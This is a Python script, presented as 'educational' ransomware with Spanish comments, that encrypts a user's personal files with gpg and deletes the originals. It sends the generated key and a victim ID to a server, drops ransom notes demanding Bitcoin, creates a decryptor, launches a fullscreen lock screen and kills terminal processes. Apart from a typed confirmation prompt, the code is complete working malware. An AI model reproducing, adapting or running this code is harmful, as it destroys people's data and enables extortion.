import os
import sys
import random
import string
import requests
import time
import subprocess
import threading
from pathlib import Path

class RansomwareEducativo:
    def __init__(self):
        # Directorios a cifrar (evitando systemas críticos)
        self.directories_to_encrypt = [
            '~/Desktop',
            '~/Documents', 
            '~/Downloads',
            '~/Pictures',
            '~/Music',
            '~/Videos'
        ]
        
        # Directorios excluidos para no dañar el sistema
        self.excluded_dirs = [
            '/bin', '/sbin', '/usr', '/lib', '/lib64',
            '/etc', '/var', '/opt', '/boot', '/sys',
            '/proc', '/dev', '/run', '/tmp', '/root',
            '/etc/passwd', '/etc/shadow', '/etc/group'
        ]
        
        self.bitcoin = '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa'
        self.price = 500
        self.url = 'http://localhost/victima.php'
        self.encryption_count = 0
        
    def expand_paths(self):
        """Convierte paths con ~ a paths absolutos"""
        expanded_dirs = []
        for directory in self.directories_to_encrypt:
            expanded_path = os.path.expanduser(directory)
            if os.path.exists(expanded_path):
                expanded_dirs.append(expanded_path)
        
        # Agregar directorio actual si no hay otros
        if not expanded_dirs:
            expanded_dirs.append('.')
            
        return expanded_dirs

    def should_encrypt(self, filepath):
        """Determina si un archivo debe ser cifrado"""
        file_str = str(filepath).lower()
        
        # Excluir archivos del sistema
        for excluded in self.excluded_dirs:
            if excluded.lower() in file_str:
                return False
        
        # Excluir archivos muy pequeños o del sistema
        try:
            if filepath.stat().st_size < 100:  # Menos de 100 bytes
                return False
        except:
            return False
            
        # Solo cifrar ciertas extensiones (evitar binarios del sistema)
        valid_extensions = ['.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', 
                          '.jpg', '.jpeg', '.png', '.mp3', '.mp4', '.avi',
                          '.zip', '.rar', '.odt', '.ppt', '.pptx', '.csv']
        
        if any(file_str.endswith(ext) for ext in valid_extensions):
            return True
            
        return False

    def generate_keys(self):
        """Genera contraseña e ID único"""
        s = string.ascii_lowercase + string.digits + string.ascii_uppercase
        self.password = ''.join(random.sample(s, 50))
        self.victim_id = ''.join(random.sample(string.ascii_lowercase + string.digits, 15))

    def send_credentials(self):
        """Envía credenciales al servidor"""
        try:
            values = {'pass': self.password, 'id': self.victim_id}
            response = requests.post(self.url, data=values, timeout=30)
            print(f"[+] Credenciales enviadas. Respuesta: {response.text}")
            return response.text.strip() == 'Ok.'
        except Exception as e:
            print(f"[-] Error enviando credenciales: {e}")
            return True  # Continuar aunque falle el envío

    def encrypt_file(self, filepath):
        """Cifra un archivo individual usando GPG"""
        try:
            if not self.should_encrypt(filepath):
                return False
                
            # Cifrar el archivo
            enc_cmd = f'gpg --batch --yes --passphrase "{self.password}" -c "{filepath}"'
            result = subprocess.run(enc_cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                # Eliminar original si el cifrado fue exitoso
                os.remove(filepath)
                self.encryption_count += 1
                return True
                
        except Exception as e:
            print(f"Error cifrando {filepath}: {e}")
            
        return False

    def encrypt_directory(self, directory):
        """Cifra todos los archivos en un directorio"""
        encrypted_files = 0
        try:
            for root, dirs, files in os.walk(directory):
                # Excluir directorios del sistema
                dirs[:] = [d for d in dirs if not any(excl in os.path.join(root, d) for excl in self.excluded_dirs)]
                
                for file in files:
                    filepath = Path(root) / file
                    if self.encrypt_file(filepath):
                        encrypted_files += 1
                        if encrypted_files % 10 == 0:
                            print(f"[+] Cifrados {encrypted_files} archivos en {directory}...")
                            
        except Exception as e:
            print(f"Error en directorio {directory}: {e}")
            
        return encrypted_files

    def create_ransom_note(self):
        """Crea la nota de rescate"""
        note = f"""
╔══════════════════════════════════════════════════════════════╗
║                    !!! ADVERTENCIA !!!                       ║
║                 SISTEMA COMPROMETIDO                         ║
╚══════════════════════════════════════════════════════════════╝

┌──────────────────────────────────────────────────────────────┐
│ SUS ARCHIVOS HAN SIDO CIFRADOS                               │
│                                                              │
│ Todos sus documentos, fotos, bases de datos y otros archivos │
│ importantes han sido cifrados con cifrado RSA-2048.          │
│                                                              │
│ Para recuperar sus archivos necesita:                        │
│                                                              │
│ 1. Pagar $ {self.price} en Bitcoin a la dirección:            │
│    {self.bitcoin}                          │
│                                                              │
│ 2. Su ID único de víctima es: {self.victim_id}       │
│                                                              │
│ 3. Contacte al administrador con su ID                       │
│                                                              │
│ ADVERTENCIAS:                                                │
│ • No apague la computadora                                   │
│ • No reinstale el sistema                                    │
│ • No intente descifrar por su cuenta                         │
│ • Tiene 72 horas antes que el precio aumente                 │
└──────────────────────────────────────────────────────────────┘

Su sistema ha sido bloqueado por seguridad.
"""
        
        # Guardar en múltiples ubicaciones
        locations = [
            '/tmp/LEAME_URGENTE.txt',
            os.path.expanduser('~/LEAME_URGENTE.txt'),
            '/home/LEAME_URGENTE.txt',
            '/LEAME_URGENTE.txt'
        ]
        
        for location in locations:
            try:
                with open(location, 'w', encoding='utf-8') as f:
                    f.write(note)
                print(f"[+] Nota de rescate creada en: {location}")
            except Exception as e:
                print(f"[-] Error creando nota en {location}: {e}")

    def create_decryptor(self):
        """Crea el script de descifrado"""
        decrypt_script = f'''#!/usr/bin/env python3
import os
import sys
import subprocess
import glob

# Configuración del sistema
VICTIM_ID = "{self.victim_id}"
BITCOIN_ADDRESS = "{self.bitcoin}"

def decrypt_system():
    print("Sistema de Recuperación de Archivos")
    print("====================================")
    print(f"ID de víctima: {{VICTIM_ID}}")
    
    password = input("\\\\nIngrese la clave de descifrado: ")
    
    print("\\\\nVerificando clave...")
    
    # Buscar y descifrar archivos .gpg
    encrypted_files = []
    for root, dirs, files in os.walk(os.path.expanduser("~")):
        for file in files:
            if file.endswith('.gpg'):
                encrypted_files.append(os.path.join(root, file))
    
    if not encrypted_files:
        print("No se encontraron archivos cifrados.")
        return
    
    print(f"Encontrados {{len(encrypted_files)}} archivos cifrados.")
    print("Iniciando descifrado...")
    
    success_count = 0
    for enc_file in encrypted_files:
        try:
            output_file = enc_file[:-4]  # Remover .gpg
            cmd = f'gpg --batch --yes --passphrase "{{password}}" -d "{{enc_file}}" > "{{output_file}}"'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                os.remove(enc_file)
                success_count += 1
                print(f"✓ Descifrado: {{os.path.basename(output_file)}}")
            else:
                print(f"✗ Error con: {{os.path.basename(enc_file)}}")
                
        except Exception as e:
            print(f"Error procesando {{enc_file}}: {{e}}")
    
    print(f"\\\\nProceso completado.")
    print(f"Archivos descifrados exitosamente: {{success_count}}/{{len(encrypted_files)}}")
    
    if success_count == len(encrypted_files):
        print("🎉 ¡Todos los archivos han sido recuperados!")
    else:
        print("⚠️ Algunos archivos no pudieron ser descifrados.")
    
    input("\\\\nPresione Enter para salir...")

if __name__ == "__main__":
    decrypt_system()
'''
        
        try:
            with open('/tmp/decrypt_files.py', 'w', encoding='utf-8') as f:
                f.write(decrypt_script)
            os.system('chmod +x /tmp/decrypt_files.py')
            print("[+] Script de descifrado creado: /tmp/decrypt_files.py")
        except Exception as e:
            print(f"[-] Error creando script de descifrado: {e}")

    def create_black_screen(self):
        """Crea una pantalla negra con el mensaje de error"""
        try:
            # Crear script para pantalla negra
            black_screen_script = '''
#!/usr/bin/env python3
import tkinter as tk
from tkinter import messagebox
import time

class BlackScreen:
    def __init__(self):
        self.root = tk.Tk()
        self.setup_screen()
        
    def setup_screen(self):
        # Pantalla completa
        self.root.attributes('-fullscreen', True)
        self.root.configure(bg='black')
        self.root.attributes('-topmost', True)
        
        # Mensaje central
        message = tk.Label(
            self.root, 
            text="FALTA REPARAR LA CONEXIÓN\\n\\nSistema no disponible\\nContacte al administrador",
            font=('Arial', 24, 'bold'),
            fg='red',
            bg='black'
        )
        message.pack(expand=True)
        
        # Contador
        self.counter = 0
        self.counter_label = tk.Label(
            self.root,
            text=f"Tiempo bloqueado: {self.counter} segundos",
            font=('Arial', 16),
            fg='white',
            bg='black'
        )
        self.counter_label.pack(side=tk.BOTTOM, pady=20)
        
        # Actualizar contador
        self.update_counter()
        
        # Bloquear teclas
        self.root.bind('<Key>', self.do_nothing)
        self.root.bind('<Button>', self.do_nothing)
        
    def do_nothing(self, event=None):
        return "break"
        
    def update_counter(self):
        self.counter += 1
        self.counter_label.config(text=f"Tiempo bloqueado: {self.counter} segundos")
        self.root.after(1000, self.update_counter)
        
    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    screen = BlackScreen()
    screen.run()
'''
            
            # Guardar y ejecutar pantalla negra
            with open('/tmp/black_screen.py', 'w') as f:
                f.write(black_screen_script)
            
            # Ejecutar en segundo plano
            subprocess.Popen([sys.executable, '/tmp/black_screen.py'])
            print("[+] Pantalla negra activada")
            
        except Exception as e:
            print(f"[-] Error creando pantalla negra: {e}")

    def block_system(self):
        """Bloquea el sistema"""
        try:
            # Bloquear acceso a terminales (reversible)
            os.system('pkill -9 terminal')
            os.system('pkill -9 gnome-terminal')
            os.system('pkill -9 xterm')
            print("[+] Terminales bloqueadas")
            
        except Exception as e:
            print(f"[-] Error bloqueando sistema: {e}")

    def execute_attack(self):
        """Ejecuta el ataque completo"""
        print("🔐 INICIANDO SIMULACIÓN DE RANSOMWARE EDUCATIVO")
        print("=" * 60)
        
        # Confirmación final
        print("ADVERTENCIA: Esto cifrará archivos y bloqueará el sistema")
        confirm = input("¿Está en un entorno controlado? (escribe 'CONFIRMAR'): ")
        if confirm != 'CONFIRMAR':
            print("Operación cancelada.")
            return
        
        # Fase 1: Preparación
        print("\\n[FASE 1] Generando claves...")
        self.generate_keys()
        print(f"   🔑 Clave: {self.password}")
        print(f"   🆔 ID: {self.victim_id}")
        
        # Fase 2: Envío de credenciales
        print("\\n[FASE 2] Enviando credenciales...")
        self.send_credentials()
        
        # Fase 3: Cifrado
        print("\\n[FASE 3] Cifrando archivos...")
        directories = self.expand_paths()
        total_encrypted = 0
        
        for directory in directories:
            print(f"   📁 Procesando: {directory}")
            encrypted = self.encrypt_directory(directory)
            total_encrypted += encrypted
            print(f"   ✅ Cifrados: {encrypted} archivos")
        
        # Fase 4: Notas de rescate
        print("\\n[FASE 4] Creando notas de rescate...")
        self.create_ransom_note()
        self.create_decryptor()
        
        # Fase 5: Bloqueo del sistema
        print("\\n[FASE 5] Bloqueando sistema...")
        self.create_black_screen()
        self.block_system()
        
        # Resumen final
        print("\\n" + "=" * 60)
        print("🎯 SIMULACIÓN COMPLETADA")
        print(f"📊 Archivos cifrados: {total_encrypted}")
        print(f"🔑 ID de recuperación: {self.victim_id}")
        print(f"💰 Rescate: ${self.price} en Bitcoin")
        print("=" * 60)
        print("\\nEl sistema se bloqueará en 5 segundos...")
        
        time.sleep(5)

# Ejecución principal
if __name__ == "__main__":
    if os.geteuid() == 0:
        print("⚠️  Ejecutando como root - EXTREMA PRECAUCIÓN")
    
    ransomware = RansomwareEducativo()
    ransomware.execute_attack()
